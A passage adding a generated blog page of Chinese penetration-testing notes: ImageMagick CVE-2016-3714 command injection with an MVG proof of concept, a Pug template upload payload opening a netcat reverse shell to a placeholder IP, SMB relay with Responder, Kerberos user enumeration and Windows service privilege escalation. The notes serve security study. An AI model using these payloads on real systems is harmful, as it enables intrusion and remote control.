@@ -1,0 +1,536 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/b6.png">
+  <link rel="icon" type="image/png" href="/img/b6.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content="">
+  <title>杂文2 - Gr3yy&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.4.0/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"gr3yyy123.github.io","root":"/","version":"1.8.7","typing":{"enable":true,"typeSpeed":90,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"onlypost":false},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.3.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Gr3yy's B1og</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                Home
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                Archives
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                Categories
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                Tags
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                About
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                Links
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="杂文2">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2021-02-03 05:01" pubdate>
+        February 3, 2021 am
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      991 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      13
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">杂文2</h1>
+            
+            <div class="markdown-body">
+              <h1 id="NOTE-2020-3-6"><a href="#NOTE-2020-3-6" class="headerlink" title="NOTE-2020/3/6"></a>NOTE-2020/3/6</h1><h2 id="CVE-2016-3714-ImageMagick-命令执行"><a href="#CVE-2016-3714-ImageMagick-命令执行" class="headerlink" title="CVE-2016-3714 - ImageMagick 命令执行"></a>CVE-2016-3714 - ImageMagick 命令执行</h2><blockquote>
+<p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/CVE-2016-3714-ImageMagick.html">https://www.leavesongs.com/PENETRATION/CVE-2016-3714-ImageMagick.html</a></p>
+</blockquote>
+<ul>
+<li>ImageMagick有一个功能叫做delegate（委托），作用是调用外部的lib来处理文件。<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">MagickExport <span class="hljs-keyword">int</span> <span class="hljs-title">ExternalDelegateCommand</span><span class="hljs-params">(<span class="hljs-keyword">const</span> MagickBooleanType asynchronous, <span class="hljs-keyword">const</span> MagickBooleanType verbose,<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *command,<span class="hljs-keyword">char</span> *message,ExceptionInfo *exception)</span></span><br><span class="hljs-function">sanitize_command</span>=SanitizeDelegateCommand(command);<br><span class="hljs-keyword">if</span> ((asynchronous != MagickFalse) ||<br>      (<span class="hljs-built_in">strpbrk</span>(sanitize_command,<span class="hljs-string">&quot;&amp;;&lt;&gt;|&quot;</span>) != (<span class="hljs-keyword">char</span> *) <span class="hljs-literal">NULL</span>))<br>    status=system(sanitize_command);<br></code></pre></td></tr></table></figure>
+可以看到使用了 <code>system</code> 函数执行委托中的 <code>command</code> 内容。</li>
+</ul>
+<p>在他的委托配置里可以看到</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">delegate</span> <span class="hljs-attr">decode</span>=<span class="hljs-string">&quot;https&quot;</span> <span class="hljs-attr">command</span>=<span class="hljs-string">&quot;<span class="hljs-symbol">&amp;quot;</span>curl<span class="hljs-symbol">&amp;quot;</span> -s -k -o <span class="hljs-symbol">&amp;quot;</span>%o<span class="hljs-symbol">&amp;quot;</span> <span class="hljs-symbol">&amp;quot;</span>https:%M<span class="hljs-symbol">&amp;quot;</span>&quot;</span>/&gt;</span><br></code></pre></td></tr></table></figure>
+<p>可以看到%M被拼接在command里,%M代表图片的远程路径。</p>
+<ul>
+<li>这个委托指远程加载https图片，先使用curl下载，%M指代远程路径，因此我们可以使用 <code>&quot;</code> 闭合掉url,然后执行命令。</li>
+<li>当 <code>%M</code> 为 : <code>https://&quot;|id &amp;&amp; ls -al /etc/passwd&quot;</code>，原命令变为 <code>command=&quot; &quot;curl&quot; -s -k -o &quot;%o&quot; &quot;https://&quot;|id &amp;&amp; ls -al /etc/passwd&quot;&quot; &quot;/&gt;</code>。</li>
+<li>因此构造poc.mvg(mvg图片为远程图片，可以包含url)<figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs smali">push graphic-context<br>viewbox 0 0 640 480<br>fill &#x27;url(https://<span class="hljs-string">&quot;|id; &quot;</span>)&#x27;<br>pop graphic-context<br></code></pre></td></tr></table></figure>
+漏洞poc : <a target="_blank" rel="noopener" href="https://github.com/ImageTragick/PoCs">https://github.com/ImageTragick/PoCs</a></li>
+</ul>
+<h2 id="Nodejs-Rce"><a href="#Nodejs-Rce" class="headerlink" title="Nodejs Rce"></a>Nodejs Rce</h2><p>使用 Node，我们不能只通过 Web 浏览器调用文件来执行文件，就像在 PHP 中一样。因此，在这种情况下，我们将使用动态路由端点尝试呈现 Pug 文件的内容。</p>
+<ul>
+<li><p>在上传过程中，文件处理程序模块会将文件重命名为随机字符串，没有扩展名。上传的响应会返回路径</p>
+</li>
+<li><p>payload：</p>
+<figure class="highlight gml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gml">-<span class="hljs-keyword">var</span> <span class="hljs-symbol">x</span> = <span class="hljs-literal">global</span>.process.mainModule.require<br>-<span class="hljs-symbol">x</span>(<span class="hljs-string">&#x27;child_process&#x27;</span>).exec(<span class="hljs-string">&#x27;nc [Your_IP] 8888 -e /bin/bash</span><br></code></pre></td></tr></table></figure></li>
+<li><p>注： 在pug中，<code>&quot;-&quot;</code> 表示执行js</p>
+</li>
+<li><p>上传成功后会返回路径</p>
+</li>
+<li><p>访问 <code>[网站地址]/drouting?filename=../uploads/[你的文件哈希]</code> 即可触发命令执行，服务器将回去连接你的vps的8888端口。</p>
+</li>
+<li><p>另附：webshell列表</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://github.com/tennc/webshell">https://github.com/tennc/webshell</a></p>
+</blockquote>
+</li>
+</ul>
+<h2 id="红队攻击"><a href="#红队攻击" class="headerlink" title="红队攻击"></a>红队攻击</h2><h3 id="密码喷洒"><a href="#密码喷洒" class="headerlink" title="密码喷洒"></a>密码喷洒</h3><p>没啥好说的</p>
+<h3 id="进入内网"><a href="#进入内网" class="headerlink" title="进入内网"></a>进入内网</h3><ul>
+<li><p>responder</p>
+</li>
+<li><p>MultiRelay</p>
+<ul>
+<li>如果不强制smb签名（可以通过nmap获知：<a target="_blank" rel="noopener" href="https://nmap.org/nsedoc/scripts/smb-security-mode.html">https://nmap.org/nsedoc/scripts/smb-security-mode.html</a> ）我们何以使用MultiRelay进行中继。</li>
+<li>步骤：<ol>
+<li>编辑 Responder 配置文件以禁用 SMB 和 HTTP 服务器</li>
+<li><code>python ./Responder.py -I eth0 -rv</code></li>
+<li><code>·cd /opt/Responder/tool &amp;&amp; ./MultiRelay.py -t -c -u AL</code></li>
+<li>成功中继的话可以生成基础shell</li>
+</ol>
+</li>
+</ul>
+</li>
+<li><p>利用kerberos枚举用户</p>
+<ul>
+<li><code>nmap -p88 --script krb5-enum-users --script-args krb5-enum-users.realm=“cyberspacekittens.local”,userdb=/opt/userlist.txt</code> - 需要准备用户列表，但是由于我们只是查询 DC 而没有对其进行身份验证，因此通常此行动不会被检测。</li>
+</ul>
+</li>
+<li><p>命令查找工具<br>记不住的windows命令可以通过这个查找：</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://github.com/leostat/rtfm">https://github.com/leostat/rtfm</a></p>
+</blockquote>
+<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-comment">#更新并运行</span><br><span class="hljs-keyword">cd</span> <span class="hljs-string">/opt/rtfm</span><br>chmod +x rtfm.py<br><span class="hljs-string">./rtfm.py</span> -u<br><span class="hljs-string">./rtfm.py</span> -c ‘rtfm’<br></code></pre></td></tr></table></figure>
+<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-comment">#列出所有标签</span><br><span class="hljs-string">./rtfm.py</span> -D<br></code></pre></td></tr></table></figure>
+<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-meta">#搜索标签下的命令</span><br>./rtfm.py -t enumeration <span class="hljs-string">| m</span><br></code></pre></td></tr></table></figure>
+<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3></li>
+<li><p>可信任服务路径提权</p>
+<p>windows中的服务一般都是高权限运行，如果服务的路径未被引用且有空格，那windows会先去匹配空格前部的应用名，例如：</p>
+<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">c:<span class="hljs-symbol">\p</span>rogrames<span class="hljs-symbol">\n</span>ew folder<span class="hljs-symbol">\p</span>lay hack.exe<br></code></pre></td></tr></table></figure>
+<p>系统的匹配顺序为</p>
+<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">c:<span class="hljs-symbol">\p</span>rogrames<span class="hljs-symbol">\n</span>ew.exe<br>c:<span class="hljs-symbol">\p</span>rogrames<span class="hljs-symbol">\n</span>ew folder<span class="hljs-symbol">\p</span>lay.exe<br>c:<span class="hljs-symbol">\p</span>rogrames<span class="hljs-symbol">\n</span>ew folder<span class="hljs-symbol">\p</span>lay hack.exe<br></code></pre></td></tr></table></figure>
+<p>所以哦我们寻找未安全引用的服务路径并上传恶意程序。</p>
+<p>查找漏洞：<code>wmic service get name,displayname,pathname,startmode|findstr /i &quot;Auto&quot; |findstr /i /v &quot;C:\Windows\&quot; |findstr/i /v &quot;&quot;&quot;</code></p>
+<p>icacls 可以查看文件夹权限：</p>
+<figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode"><span class="hljs-comment">(M)</span>代表修改权限，<span class="hljs-comment">(F)</span>代表完全控制，<span class="hljs-comment">(CI)</span>代表从属容器将继承访问控制项，<span class="hljs-comment">(OI)</span>代表从属文件将继承访问控制项。<br></code></pre></td></tr></table></figure></li>
+<li><p>系统服务错误配置</p>
+<p>系统服务一般是开机自动加载，且以system权限运行，如果一个低权限用户拥有对可执行文件写的权力，则可以更改可执行文件，写入恶意shell。</p>
+</li>
+<li><p>不安全的注册表权限配置</p>
+</li>
+</ul>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/%E6%97%A7%E7%9A%84%E5%BD%92%E6%A1%A3/">旧的归档</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/Misc/">Misc</a>
+                    
+                      <a class="hover-with-bg" href="/tags/Web/">Web</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2021/02/03/%E6%9D%82%E6%96%871/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">杂文1</span>
+                        <span class="visible-mobile">Previous</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2021/02/03/%E6%9D%82%E6%96%873/">
+                        <span class="hidden-mobile">杂文3</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;TOC</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+
+  
+
+  
+</footer>
+
+<!-- SCRIPTS -->
+
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.0/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.0/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js" ></script>
+
+
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.11/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    (function () {
+      var path = "/local-search.xml";
+      var inputArea = document.querySelector("#local-search-input");
+      inputArea.onclick = function () {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+        this.onclick = null
+      }
+    })()
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+
+</body>
+</html>
